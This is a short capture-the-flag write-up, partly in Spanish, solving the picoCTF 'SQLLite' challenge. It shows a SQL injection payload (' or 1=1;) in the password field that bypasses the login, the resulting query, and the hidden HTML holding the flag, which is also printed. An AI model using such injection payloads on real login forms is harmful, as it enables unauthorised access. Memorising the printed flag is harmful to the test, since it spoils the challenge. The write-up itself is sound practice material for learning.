## SQLLite

# objetivo
- Can you login to this website? Try to login [here](http://saturn.picoctf.net:64301/).

# Hints
- `admin` is the user you want to login as.

# solucion
``` bash 
username: admin
password: hola mundo
SQL query: SELECT * FROM users WHERE name='admin' AND password='hola mundo'

Login failed.
hacemos una iyeccion para que haga la consulta en la base de datos.

username: admin
password: 'or 1=1;
SQL query: SELECT * FROM users WHERE name='admin' AND password=''or 1=1;'

Logged in! But can you see the flag, it is in plainsight.
luego inspeccionamos para encontrar la bandera
</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_9b0a4e21}</p>

```
# bandera
- picoCTF{L00k5_l1k3_y0u_solv3d_it_9b0a4e21}